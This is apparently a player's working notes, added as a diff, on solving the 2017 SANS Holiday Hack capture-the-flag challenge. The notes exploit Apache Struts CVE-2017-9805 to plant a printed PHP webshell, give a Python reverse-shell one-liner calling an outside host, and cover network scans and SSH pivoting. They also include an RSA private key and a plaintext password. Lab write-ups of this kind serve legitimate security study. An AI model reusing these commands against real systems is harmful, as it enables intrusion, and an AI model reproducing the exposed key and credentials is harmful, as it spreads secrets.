@@ -1,3 +1,126 @@
+
+The whole North Pole - the elves, the reindeer, and Santa himself, as well as yours truly - are counting on you! Please help us redirect the destructive snowballs, apprehend the villain, and restore The Great Book by answering the following questions as you explore the North Pole and Beyond. 
+
+SCOPE
+
+Letters to Santa System
+
+l2s.northpolechristmastown.com
+10.142.0.0/24
+
+Downloads from
+nppd.northpolechristmastown.com
+
+NOT authorised to exploit any of the North Pole and Beyond puzzler, chat and video game components. 
+
+
+
+1) Visit the North Pole and Beyond at the Winter Wonder Landing Level to collect the first page of The Great Book using a giant snowball. What is the title of that page?
+
+2) Investigate the Letters to Santa application at https://l2s.northpolechristmastown.com. What is the topic of The Great Book page available in the web root of the server? What is Alabaster Snowball's password?
+
+For hints associated with this challenge, Sparkle Redberry in the Winconceivable: The Cliffs of Winsanity Level can provide some tips.
+
+3) The North Pole engineering team uses a Windows SMB server for sharing documentation and correspondence. Using your access to the Letters to Santa server, identify and enumerate the SMB file-sharing server. What is the file server share name?
+
+For hints, please see Holly Evergreen in the Cryokinetic Magic Level.
+
+4) Elf Web Access (EWA) is the preferred mailer for North Pole elves, available internally at http://mail.northpolechristmastown.com. What can you learn from The Great Book page found in an e-mail on that server?
+
+Pepper Minstix provides some hints for this challenge on the There's Snow Place Like Home Level.
+
+5) How many infractions are required to be marked as naughty on Santa's Naughty and Nice List? What are the names of at least six insider threat moles? Who is throwing the snowballs from the top of the North Pole Mountain and what is your proof?
+
+Minty Candycane offers some tips for this challenge in the North Pole and Beyond.
+
+6) The North Pole engineering team has introduced an Elf as a Service (EaaS) platform to optimize resource allocation for mission-critical Christmas engineering projects at http://eaas.northpolechristmastown.com. Visit the system and retrieve instructions for accessing The Great Book page from C:\greatbook.txt. Then retrieve The Great Book PDF file by following those directions. What is the title of The Great Book page?
+
+For hints on this challenge, please consult with Sugarplum Mary in the North Pole and Beyond.
+
+7) Like any other complex SCADA systems, the North Pole uses Elf-Machine Interfaces (EMI) to monitor and control critical infrastructure assets. These systems serve many uses, including email access and web browsing. Gain access to the EMI server through the use of a phishing attack with your access to the EWA server. Retrieve The Great Book page from C:\GreatBookPage7.pdf. What does The Great Book page describe?
+
+Shinny Upatree offers hints for this challenge inside the North Pole and Beyond.
+
+8) Fetch the letter to Santa from the North Pole Elf Database at http://edb.northpolechristmastown.com. Who wrote the letter?
+
+For hints on solving this challenge, please locate Wunorse Openslae in the North Pole and Beyond.
+
+9) Which character is ultimately the villain causing the giant snowball problem. What is the villain's motive?
+
+To answer this question, you need to fetch at least five of the seven pages of The Great Book and complete the final level of the North Pole and Beyond. 
+
+
+
+Level 1
+
+https://2017.holidayhackchallenge.com/
+
+First zone - find and run the elftalkd binary. 
+Cant 'locate'
+Find seems to be not working. 
+Cat find
+
+What do we have here??
+
+fp
+kq
+◆?
+??O345678       ??;��OCDEFGH:I␍┐JK␊┼L12␊°─M;N=>?@AB=>?@AB␊␊\⎺Z[┘⎻XX
+         9=>?@AB<0P/QR?TUVW^_`YiabclmeXUWTVRS8;ADI>Q%#X
+4J5&-69?BE<'$Z KLNOPM7:@CF=(/ZYGH!3,"+02).[Z?*?         !"####$$$%%&''((((((())))*********+,,,---------------------....../0011223455���������壣�����<������+� !"#gh$%&'()*+,
+-.]TZGMTWETAMJANUARYYEARTOMORROWBDSTTZ="XXX%s%ld:%02dACFGHIKMOPQSVWXZWESTBSTARTBRTBRSTNSTNDTASTADTCLTCLSTESTEDTCSTCDTMSTMDTPSTPDTAKSTAKDTHSTHASTHADTSSTWATCETCESTMETMEZMESTMESZEETEES
+TCATSASTEATMSKMSDISTSGTKSTJSTGSTNZSTNZDTUTUTCYESTERDAYTODAYNOWLASTTHISNEXTFIRSTTHIRDFOURTHFIFTHSIXTHSEVENTHEIGHTHNINTHTENTHELEVENTHTWELFTHAGOHENCEMONTHFORTNIGHTWEEKDAYHOURMINUTEMINS
+ECONDSECFEBRUARYMARCHAPRILMAYJUNEJULYAUGUSTSEPTEMBERSEPTOCTOBERNOVEMBERDECEMBERSUNDAYMONDAYTUESDAYTUESWEDNESDAYWEDNESTHURSDAYTHURTHURSFRIDAYSATURDAYA.M.PMP.M.A NULL argv[0] was pass
+ed through an exec system call.
+/.libs/lt-G���P\ekkk[[[[[[QK�W��[[[[[[[[[[[[[[[[[[���z�{�����{{{{{{{{{{{{{{{{����[{{{{{{{{{{{{{{{{{{{{{{{{{{�{�{�{{{{{{{{{{{{{{{{{{{{{{{{{{u�uz����������������������w�W�������������
+������������������������O�O�O���O���O�}�O�O�O���������������������������������O�O�O�O���������������������������������������������������������O�����O���O����������������������������
+���������������������������O�����n�n�n�n�n�n�n�n�n�n�n�n�n�n�n�n�n�n�n�n�n�n�n�n�n�n�n�n�n����������������������‘’�e��"`literalshellshell-alwaysshell-escapeshell-escape-alwaysc-mayb
+eescapelocaleclocalezl^N>. |%s (%s) %s
+%s %s
+(C)
+
+can we get this file to attacker box and decompile?
+
+OR
+
+I see this as a potential format string hint
+|%s (%s) %s
+
+@GreenestElf  (Bushy Evergreen)
+An Nginx elf trying to live in an Apache world. "2012 Elf on the Shelf - Snowy" by Mark Baylor is CC BY 2.0
+
+Command line skills needed. 
+
+ Bushy Evergreen‏ @GreenestElf
+Dec 5
+
+Ugh, somebody copied over the wrong `find` executable to my system today. How am I supposed to know where find normally is?!
+
+tool called l2s   ?
+
+file type is an arm executable, trying to run it on x64 
+
+cant apt-get
+cant write files (due to no text editor)
+
+Is this an environment variable thing? It appears the /usr/local/bin and /usr/local/sbin files are wrong format, but just the /usr/bin file seems ok. 
+
+export PATH=/usr/bin
+
+that appears to work
+
+find / -executable -type f
+
+Aaaand there it is
+
+/run/elftalk/bin/elftalkd
+
+I made that much more complicated than it should be....
+Over thinking it. Maybe we can investigate the contents of the corrupted file some more later. 
+
+Ironic as I managed to wreck a VM this week because of environment variables. 
+
+
 Holiday Hack - level 2 (unvonceivable, the cliffs of winsanity)
 Sparkle Redberry 
 "Help me kill the troublesome process gone awry"
@@ -22,6 +145,14 @@ Not even root can execute
 options?
 
 Come back later. 
+
+** update - done
+
+/lib64/ld-linux-x86-64.so.2 /path/to/file
+
+
+
+
 
 Now it's time for l2s.northpolechristmastown.com
 
@@ -56,5 +187,426 @@ That business with Equal-Facts Inc was really unfortunate. I understand there ar
 
 
 The hints have some pretty useful info! Use these when back on it. 
+
+
+Current step -> Exploit the web server 17/12/2017
+
+https://l2s.northpolechristmastown.com/
+
+   <!-- Development version -->
+    <a href="http://dev.northpolechristmastown.com" style="display: none;">Access Development Version</a>
+
+
+Hints elude to NOT being vuln to 
+CVE-2017-5638
+
+lets look at
+
+CVE-2017-9805
+
+OK all hints point to this. 
+Must be the one. 
+
+Example given =
+https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code
+https://github.com/chrisjd20/cve-2017-9805.py
+
+let's try using this to wget this
+
+https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/be4b2c021b284f21418f55b9d4496cdd3b3c86d8/easy-simple-php-webshell.php
+
+which is 
+
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if($_GET['cmd'])
+    {
+        system($_GET['cmd']);
+    }
+?>
+</pre>
+</body>
+<script>document.getElementById("cmd").focus();</script>
+</html>
+
+and place it in the webroot. 
+
+/var/www/html/
+
+command will look something like
+
+'wget https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/be4b2c021b284f21418f55b9d4496cdd3b3c86d8/easy-simple-php-webshell.php > /var/www/html/ldtest2'
+
+Code execution via the script - confirmed on my own webserver - Screenshotted
+
+Now where is the file going? Do we even have write access? I'm going to go ahead and assume yes - since the logic of the webservice requires file creation. 
+
+paths to try
+/var/www/html/ - executes
+/orders/  - didnt work
+/var/www/
+/
+/orders/new/ - doesnt work
+
+Payload doesnt execute with no full file path
+ie wget xxx.xxx.xxx.xxx -O filename.php doesnt work
+but ""  	""	"" -O /var/www/html/filename.php does work
+
+MAYBE we need a null byte or some other form of file inclusion
+
+Maybe it's file type. Let's try txt
+
+Ok so if we use 
+
+python 2017-9805.py -u https://dev.northpolechristmastown.com/orders/new -c 'wget http://178.62.61.136/ -O /var/www/html/ldtest'
+
+we can get something that looks like it's working. Now replace the wget to the webshell and let's try that.
+
+full command =
+
+'wget https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/be4b2c021b284f21418f55b9d4496cdd3b3c86d8/easy-simple-php-webshell.php > /var/www/html/ldtest2'
+
+
+Doesnt seem to get the code rendered. try this with some text only. 
+
+'wget https://raw.githubusercontent.com/Lightraine2/holidayhack2017/master/test.txt > /var/www/html/ldtest3'
+
+Ok so the app logic doesnt really help here. Renders /orders/(whatever)
+
+
+Oh balls - it's outputting to l2s
+https://l2s.northpolechristmastown.com/
+
+It's def getting written to the web root, but render in page is difficult. Maybe we can try and execute a php reverse shell?
+
+python 2017-9805.py -u https://dev.northpolechristmastown.com/orders/new -c 'wget https://raw.githubusercontent.com/Lightraine2/holidayhack2017/master/test.txt > /var/www/html/ldtest3.txt'
+
+try 
+python 2017-9805.py -u https://dev.northpolechristmastown.com/orders/new -c 'wget https://raw.githubusercontent.com/Lightraine2/holidayhack2017/master/webshell.html > /var/www/html/ldtest.html'
+
+Ok we've got the document root. 
+
+
+Done the next snowball challenge. 
+
+OK so MAYBE it's not about a webshell. Maybe we can do this another way? use the code execution to read files and post to pastebin?
+
+
+Aaand the 4th cranberry pi
+
+qemu-arm filename
+
+simples.
+
+
+
+
+Back to the l2s server. 
+
+OMG i got it. So silly. Wasnt using -O for output file. 
+
+python 2017-9805.py -u https://dev.northpolechristmastown.com/orders/new -c 'wget https://raw.githubusercontent.com/Lightraine2/holidayhack2017/master/webshell.html -O /var/www/html/ldtest.php'
+
+works
+
+now we have a shell. Goes to show a few hours of gaming can help sometimes :)
+
+
+Private Key?? Someone put this here
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpgIBAAKCAQEA52rB7aeMtn0SgyfQROLMjYfCCtOfg+XzNjKy//ppjyboUPc+
+qjzjYc4f0mZL/Mif1tMxU3WgfqmD0na9HcYVtEGH/rTC272EjNOzD1HchfgW2n/D
+0AoC0Bh6XQ+tUTmMSBaAZaljuQKdy/xR0hiFGWVA1pNyiRTV5bC56EpDhrQU2XiX
+HbQqB3N+8NfMG9N++uTjBSMC3kuTOUwMc7uPScLp6Ej9FhdoBvrxgdqbiiu8qOlY
+TkDKWa1zVEgTltbcocjAg9A+lAnlW9SNJli0d8QcDZ9WvUblysWqookojPiW8ilU
+S3yURgIJRSl3m3RBEUdJcumb/+mraumj3aTVAQIDAQABAoIBAQDFtKlVlk1bIuOL
+9ZmzIGhNiew3P7EKCIyOgyX2F0PTrxPPCEwbOMWyK114bTkCD4yvBeMgQGALllsu
+lY7gPvkP9ORwsJHBFdqGTd6ueeuC8P7lUT5DICpjCmaP1vLlb9rvQ3oSYHL3/so9
+GaX1bklX9u874uB5SLms8B0D3V5vVw5rUGnX8EHBaCclAdffCK9SjjJ8YpsGdg6b
+BlRGEiQYv7mtNJBla1ivi1Mh+bBKLbwZjKDaqlK4DBbj1RpRZf5yZ+c/FaEhiNT4
+x4wB5dZdDNr+5gQJJiRhs5jOfIVK5b4uu3MI4yiWGA3K191uCclze4DfSZ83zE+K
+ke6AiO4hAoGBAPmd2SDnylBkafu+4YNTuG0/uozys0hr2cMZw9fcuWug669VbrPN
+VZdpBJ7Ih14FObFmVbOgqfIh0TgwKkylpprIHZvxUd3Zdfl40irlHAoYKN3Sungz
+CVUrf9bFpexbsNCNM4Ce+6t8kyKp5JOx7Qqs2R8twqE8utCnNYB8SQJlAoGBAO1V
+w2BDIHZiVMc76B/m2yp6xaaPJN102Dn04LyHsH8cCOGl+1rEv5eiNt755li03MzQ
+zDM5wn57TBUG9rYPIqH0//NQxKlSVK9aHSoXh5gionCI9w2srYXn0OwPDFmKMlgx
+I97UHdl2z0/Knu9Q2vgczmscLsSxl1eu7gbt/pBtAoGBAPhIlKdRRwBN0Mlx5Nf+
+10v7frAh3Egl1pVkNFOrHde7WZKt1I4NqJwQ/mJ9rX/MjMUyt/4Sydeo4XUVG43f
+mucMM79f+oFDg0AgeFPoTcqQm12A9K8IfLj1qpPTRqXh0e6u9FJ0UHoTUDrDaDOs
+X84lfVWw6437XQqbtvDVLr2tAoGBAOBaMlbNHeLLEVlFSCjgEk4VwMGyjybJTZ17
+3vZZTn7aAYtNXE5xrquorDYcBaPVVORIfL/v2eu2ojU+X/m6VQLEly9rKnzlVyhs
+ByXDGGq4UtYOo3xJv77VZKnBj+sUuIKl8UKzQYRQy6ih4ZxY0qW4lWirO4q0VlyN
+AHWMhRgBAoGBAPEEJX6w+PwwZrd2I07waYOJ9YoKIwnGARcK5EIKFZCzCCL+hhak
+W5xb9953hu4Ylj2tQyjb+XQG23PLEUDB0+9+PrjtUL15WXINDzGU46TUvgOsJjvg
+F7VjmclULrE+16jdUZx6TobmWryUjm/Ft62z27BdlezmxRvA/PeI3dhJ
+-----END RSA PRIVATE KEY-----
+
+gke-ed150e57664e0ca33a0d:x:1000:1001::/home/gke-ed150e57664e0ca33a0d:/bin/bash
+chris:x:1002:1003::/home/chris:/bin/bash
+alabaster_snowball:x:1003:1004:Alabaster Snowball,,,:/home/alabaster_snowball:/bin/rbash
+daniel:x:1004:1005::/home/daniel:/bin/bash
+messagebus:x:108:112::/var/run/dbus:/bin/false
+ron:x:1005:1006::/home/ron:/bin/bash
+dpendolino:x:1006:1007::/home/dpendolino:/bin/bash
+tkh16:x:1007:1008::/home/tkh16:/bin/bash
+jeff:x:1008:1009::/home/jeff:/bin/bash
+tom:x:1009:1010::/home/tom:/bin/bash
+
+
+test-123987.txt
+
+Is that a hint for password?
+
+We need to find the password.
+
+Grep recursively?
+
+grep -r "password" /
+
+search for the string recursively starting from /
+
+
+19:47
+Scrooge_McDave
+remember there are TWO web apps running on l2s 
+
+password has to be in the web app directory ... check both
+
+interesting -
+
+/usr/share/doc/screen/examples/screenrc:# This is how one can set a reattach password:
+/usr/share/doc/screen/examples/screenrc:# password ODSJQf.4IJN7E    # "1234"
+
+/usr/share/perl5/Debconf/Element/Web/Password.pm:	$_.="".$this->question->description."\n";
+/usr/share/perl5/Debconf/Element/Dialog/Password.pm:	my @params=('--passwordbox');
+
+
+@RealDanielPendolino ssh connected to the HA proxy with alabaster's creds
+
+Shell command for c2 connection
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ec2-18-216-98-99.us-east-2.compute.amazonaws.com",41344));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+
+19:47
+Scrooge_McDave
+remember there are TWO web apps running on l2s 
+
+password has to be in the web app directory ... check both
+
+
+
+
+upstream backends {
+    server 127.0.0.1:8080;
+}
+
+server {
+    listen 80;
+    index index.php index.html index.htm;
+    server_name 35.185.84.51;
+    location / {
+        root /var/www/html;
+        allow 107.139.194.111;
+        allow 24.214.105.179;
+        allow 24.214.166.143;
+        allow all;
+    }
+    location ~ \.php$ {
+        include snippets/fastcgi-php.conf;
+        fastcgi_pass unix:/run/php/php7.0-fpm.sock;
+        root /var/www/html;
+        allow 107.139.194.111;
+        allow 24.214.105.179;
+        allow 24.214.166.143;
+        allow all;
+    }
+}
+
+server {
+    listen 80;
+    index index.php index.html index.htm;
+    server_name l2s.northpolechristmastown.com;
+    location / {
+        root /var/www/html;
+        allow 172.3.206.131;
+        allow 107.139.194.111;
+        allow 24.214.105.179;
+        allow 24.214.166.143;
+        allow all;
+    }
+    location ~ \.php$ {
+        include snippets/fastcgi-php.conf;
+        fastcgi_pass unix:/run/php/php7.0-fpm.sock;
+        root /var/www/html;
+        allow 172.3.206.131;
+        allow 107.139.194.111;
+        allow 24.214.105.179;
+        allow 24.214.166.143;
+        allow all;
+    }
+}
+
+
+server {
+    listen 80;
+    index index.php index.html index.htm;
+    server_name dev.northpolechristmastown.com;
+    location / {
+        proxy_pass http://backends/;
+        root /var/www/html;
+        allow 107.139.194.111;
+        allow 24.214.105.179;
+        allow 24.214.166.143;
+        allow all;
+    }
+}
+
+
+
+# Self signed certificates generated by the ssl-cert package
+# Don't use them in a production server!
+
+ssl_certificate /etc/ssl/certs/ssl-cert-snakeoil.pem;
+ssl_certificate_key /etc/ssl/private/ssl-cert-snakeoil.key;
+
+
+OK this isnt relevant
+
+
+SO - 
+
+we gotta find this password. Looking in the two directories /apache2/ and /nginx/
+
+grep -r "password" /nginx/ /apache2/ folders
+
+
+
+GOT IT
+
+
+Ok i'm in. And it was in the bloody home directory. 
+
+DB connection script. 
+
+Derp. 
+
+How do we get this pdf out??
+
+base64 encode?
+
+Out file into the webserver :):):) 
+
+Meh, WinSCP. 
+
+Next step -> Enumerate internal network, find the SMB server and file shares
+
+
+alabaster_snowball@l2s:~$ cat /etc/hosts
+127.0.0.1	localhost l2s dev.northpolechristmastown.com l2s.northpolechristmastown.com
+10.142.0.5	mail.northpolechristmastown.com ewa.northpolechristmastown.com
+10.142.0.13	eaas.northpolechristmastown.com
+10.142.0.6	edb.northpolechristmastown.com
+::1		localhost l2s ip6-localhost ip6-loopback
+ff02::1		ip6-allnodes
+ff02::2		ip6-allrouters
+
+10.142.0.11 hhc17-apache-struts2.c.holidayhack2017.internal hhc17-apache-struts2  # Added by Google
+169.254.169.254 metadata.google.internal  # Added by Google
+
+
+Ping sweep for more SSH access
+nmap 10.142.0.0/24 -PS -p 22 -v
+
+10.142.0.2
+10.142.0.3 (host)
+10.142.0.6 (elf database - web services open  /dev ) 
+10.142.0.8 -f (smb file share) 
+10.142.0.11
+10.142.0.13 -f 
+
+cread =
+
+alabaster_snowball
+stream_unhappy_buy_loss
+35.185.84.51
+
+hmm - so we need to practice some pivoting now. Getting that ssh reverse proxy to hit some internal clients. 
+
+Read article
+https://help.ubuntu.com/community/SSH/OpenSSH/PortForwarding
+
+
+So we are looking for an SMB file share. 
+Port 445
+445 and 3389 are open on 10.142.0.7
+
+Potentially we can set up port forwarding via Puttty.
+
+
+example, running ssh -L :445:SMBSERVERIP:445 username@sshserver 
+smbclient -L smbserverorforwarder -U username
+
+https://blog.devolutions.net/2017/4/how-to-configure-an-ssh-tunnel-on-putty
+this works for rdp but user isnt in rdp users group. 
+
+Got to be a syntax error in the following 
+
+1st - set up proxy on l2s server
+
+root@kali:~/Desktop# ssh -L :445:10.142.0.8:445 alabaster_snowball@35.185.84.51
+
+
+then smbclient 
+
+root@kali:~/Desktop# smbclient -L 35.185.84.51  -U alabaster_snowball
+
+
+
+ smbclient -L 127.0.0.1 -U alabaster_snowball
+ 
+
+actually gets the connection going
+
+bah let's try the mail server
+
+rdp hosts
+8, 13
+
+ 
+OK so we can get at the elf mail server - hints at an AES encryption process to create a cookie. Potential weakness in the implementation here as we could create a new cookie and edit our own to pass it in. 
+
+Lesson here - dont just tunnel the one port. 
+
+
+now we have the cookie creator - gotta figure out how it works. carful with the username. this has to be correct. 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
